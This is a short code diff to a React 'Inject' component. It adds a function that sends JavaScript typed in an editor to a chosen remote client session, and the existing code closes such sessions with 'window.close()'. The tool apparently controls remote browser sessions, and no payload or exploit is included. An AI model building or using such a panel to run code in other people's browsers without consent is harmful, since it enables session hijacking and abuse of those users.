@@ -1765,8 +1765,12 @@ class Inject extends Component {
 
   closeSession = id => {
     let { token, client } = this.state.selectedClient
-
     this.execute(token, client.sessions[id].id, 'window.close()')
+  }
+
+  executeSession = id => {
+    let { token, client } = this.state.selectedClient
+    this.execute(token, client.sessions[id].id, this.state.code)
   }
 
   switchClient = (token) => {
@@ -1834,7 +1838,7 @@ class Inject extends Component {
         </div>
         <div className="inject-editor-container">
           {this.state.selectedClient && this.state.selectedClient.client && this.state.selectedClient.client.sessions &&
-            <ChromeTabs tabs={this.state.selectedClient.client.sessions} onClose={this.closeSession} />
+            <ChromeTabs tabs={this.state.selectedClient.client.sessions} onClose={this.closeSession} onExecute={this.executeSession} />
           }
           <MonacoEditor
             language="javascript"
